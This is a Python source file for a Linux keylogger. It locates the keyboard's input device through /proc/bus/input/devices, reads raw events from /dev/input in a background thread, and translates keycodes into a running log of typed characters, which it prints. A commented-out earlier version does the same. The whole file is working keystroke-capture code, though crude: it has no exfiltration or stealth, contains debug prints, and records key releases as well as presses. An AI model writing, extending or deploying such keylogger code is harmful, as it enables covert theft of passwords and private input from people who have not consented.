import struct
from sys import stderr
import os
from threading import Thread, Lock
from time import sleep

# Translation Table
table = {
        2:"1",
        3:"2",
        4:"3",
        5:"4",
        6:"5",
        7:"6",
        8:"7",
        9:"8",
        10:"9",
        11:"0",
        12:"-",
        13:"=",
        14:"\b",
        15:"\t",
        16:"q",
        17:"w",
        18:"e",
        19:"r",
        20:"t",
        21:"y",
        22:"u",
        23:"i",
        24:"o",
        25:"p",
        26:"{",
        27:"}",
        28:"\n",
        29:"'LCTRL'",
        30:"a",
        31:"s",
        32:"d",
        33:"f",
        34:"g",
        35:"h",
        36:"j",
        37:"k",
        38:"l",
        39:";",
        40:"'",
        41:"",
        42:"'LSHIFT'",
        43:"\\",
        44:"z",
        45:"x",
        46:"c",
        47:"v",
        48:"b",
        49:"n", 
        50:"m",
        51:",",
        52:".",
        53:"/",
        54:"'RSHIFT'",
        56:"'LALT'",
        57:" ",
        58:"'CAPSLOCK'",
        59:"'F1'",
        60:"'F2'",
        61:"'F3'",
        62:"'F4'",
        63:"'F5'",
        64:"'F6'",
        65:"'F7'",
        66:"'F8'",
        67:"'F9'",
        68:"'F10'"
}

class Done(Exception):
    pass


class Keylogger:


    def __init__(self):
        # This stores every key press.
        self.__keylog = ""
        self.__stop = False
        self.__thread = None
        self.__lock = Lock()
    

    def __read_keystrokes(self, event_identifier):
        while not self.__stop:
            with open(f"/dev/input/{event_identifier}", "rb") as f:
                data = f.read(24)
                event = struct.unpack('4IHHI', data)
                print(event)
                value = event[6]
                keycode = event[5]
                try:
                    self.__lock.acquire()
                    self.__keylog += table[keycode]
                    self.__lock.release()
                except KeyError:
                    self.__lock.release()


    def start(self):
        # 1. Parse the /proc/bus/input/devices file for keyboard devices.
        lines = []
        index = 0
        target = ""
        # 1.1. Read everything in the /proc/bus/input/devices file.
        if not os.path.exists("/proc/bus/input/devices"):
            print("ERROR: /proc/bus/input/devices does not exist.", file=stderr)
            exit(1)
        with open("/proc/bus/input/devices", "r") as f:
            lines = f.readlines()
        # 1.2. If a line contains "keyboard", save the line and break.
        for line in lines:
            if "keyboard" in line or "Keyboard" in line:
                target = lines[index+4]
                break
            index += 1
        if not target:
            print("ERROR: No keyboard device detected.", file=stderr)
            exit(1)
        # 1.3. For each of the saved lines, get the eventX id.
        event_identifier = ""
        pieces = target.split(" ")
        event_identifier = ""
        for piece in pieces:
            if "event" in piece:
                event_identifier = piece
                break
        if not event_identifier:
            print("ERROR: EventX file does not exist.", file=stderr)
            exit(1)
        print(event_identifier)
        # 2. Start reading the eventX file and saving the key strokes.
        # This might need to be a thread, which we can then stop using the stop() call.
        self.__thread = Thread(target=self.__read_keystrokes, args=(event_identifier,))
        self.__thread.start()


    def stop(self):
        if self.__thread is None:
            print("ERROR: Calling stop() on keylogger that is NOT running.", file=stderr)
            exit(1)
        self.__stop = True
        print("Signalled keylogger to stop.")
    

    def print_keylog(self):
        self.__lock.acquire()
        print(self.__keylog)
        self.__lock.release()


if __name__ == "__main__":
    k = Keylogger()
    k.start()
    sleep(10)
    k.stop()
    k.print_keylog()

# Open the /proc/bus/input/devices file and find the correct eventX file
# to read from.


#bytes_payload = ""
#try:
#    with open("/dev/input/event9", "rb") as f:
#        while True:
#            data = f.read(24)
#            event = struct.unpack('4IHHI', data)
#            type = event[4]
#            value = event[6]
#            keycode = event[5]
#            if value == 1:
#                try:
#                    bytes_payload += table[keycode]
#                except KeyError:
#                    pass
#except KeyboardInterrupt:
#    print("Done.")
#    print(bytes_payload)

